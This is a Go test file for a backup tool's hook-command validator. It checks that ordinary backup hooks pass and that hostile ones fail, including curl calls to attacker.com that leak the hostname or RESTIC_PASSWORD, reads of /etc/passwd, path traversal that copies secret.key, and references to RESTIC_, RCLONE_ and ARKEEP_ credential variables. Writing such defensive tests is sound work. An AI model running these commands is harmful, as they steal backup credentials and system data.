package api

import (
	"strings"
	"testing"
)

func TestValidateHookCommand(t *testing.T) {
	t.Run("empty command is valid", func(t *testing.T) {
		if err := validateHookCommand(""); err != nil {
			t.Errorf("unexpected error for empty command: %v", err)
		}
	})

	t.Run("common legitimate hooks are accepted", func(t *testing.T) {
		valid := []string{
			"pg_dump mydb > /backup/dump.sql",
			"mysqldump -u root mydb | gzip > /var/backups/mysql.sql.gz",
			"/usr/local/bin/pre-backup.sh",
			"systemctl stop myapp && systemctl start myapp",
			"docker exec postgres pg_dump -U postgres mydb > /backup/db.sql",
			"tar -czf /backup/data.tar.gz /var/data",
			"restic snapshots",   // restic binary itself is fine — only env vars are blocked
			"echo 'backup done'", // single quotes are fine
		}
		for _, cmd := range valid {
			if err := validateHookCommand(cmd); err != nil {
				t.Errorf("valid command %q rejected: %v", cmd, err)
			}
		}
	})

	t.Run("exceeds max length", func(t *testing.T) {
		long := strings.Repeat("a", hookMaxLen+1)
		if err := validateHookCommand(long); err == nil {
			t.Error("expected error for command exceeding max length")
		}
	})

	t.Run("exactly at max length is accepted", func(t *testing.T) {
		exact := strings.Repeat("a", hookMaxLen)
		if err := validateHookCommand(exact); err != nil {
			t.Errorf("command at max length should be valid: %v", err)
		}
	})

	t.Run("blocks command substitution $(...)", func(t *testing.T) {
		cmds := []string{
			"echo $(cat /etc/passwd)",
			"curl http://attacker.com/$(cat /etc/hostname)",
			"pg_dump $(echo mydb)",
		}
		for _, cmd := range cmds {
			if err := validateHookCommand(cmd); err == nil {
				t.Errorf("command substitution not blocked: %q", cmd)
			}
		}
	})

	t.Run("blocks command substitution via backticks", func(t *testing.T) {
		cmds := []string{
			"echo `cat /etc/passwd`",
			"curl http://attacker.com/`hostname`",
		}
		for _, cmd := range cmds {
			if err := validateHookCommand(cmd); err == nil {
				t.Errorf("backtick substitution not blocked: %q", cmd)
			}
		}
	})

	t.Run("blocks path traversal", func(t *testing.T) {
		cmds := []string{
			"cat ../../etc/passwd",
			"/bin/sh ../../../evil.sh",
			"cp ../secret.key /tmp/stolen",
		}
		for _, cmd := range cmds {
			if err := validateHookCommand(cmd); err == nil {
				t.Errorf("path traversal not blocked: %q", cmd)
			}
		}
	})

	t.Run("blocks RESTIC_ env var references", func(t *testing.T) {
		cmds := []string{
			"echo $RESTIC_PASSWORD",
			"curl http://attacker.com/?p=$RESTIC_PASSWORD",
			"echo ${RESTIC_REPOSITORY}",
			// lowercase variant
			"echo $restic_password",
		}
		for _, cmd := range cmds {
			if err := validateHookCommand(cmd); err == nil {
				t.Errorf("RESTIC_ env var reference not blocked: %q", cmd)
			}
		}
	})

	t.Run("blocks RCLONE_ env var references", func(t *testing.T) {
		cmds := []string{
			"echo $RCLONE_CONFIG",
			"cat ${RCLONE_CONFIG_S3_ACCESS_KEY_ID}",
			"echo $rclone_config",
		}
		for _, cmd := range cmds {
			if err := validateHookCommand(cmd); err == nil {
				t.Errorf("RCLONE_ env var reference not blocked: %q", cmd)
			}
		}
	})

	t.Run("blocks ARKEEP_ env var references", func(t *testing.T) {
		cmds := []string{
			"echo $ARKEEP_AGENT_TOKEN",
			"echo ${ARKEEP_SECRET}",
		}
		for _, cmd := range cmds {
			if err := validateHookCommand(cmd); err == nil {
				t.Errorf("ARKEEP_ env var reference not blocked: %q", cmd)
			}
		}
	})

	t.Run("error messages identify the blocked pattern", func(t *testing.T) {
		errCases := []struct {
			cmd     string
			wantMsg string
		}{
			{"echo $(id)", "command substitution"},
			{"cat ../etc/passwd", "path traversal"},
			{"echo $RESTIC_PASSWORD", "environment variable"},
		}
		for _, tc := range errCases {
			err := validateHookCommand(tc.cmd)
			if err == nil {
				t.Errorf("expected error for %q", tc.cmd)
				continue
			}
			if !strings.Contains(err.Error(), tc.wantMsg) {
				t.Errorf("error for %q = %q, want message containing %q", tc.cmd, err.Error(), tc.wantMsg)
			}
		}
	})
}
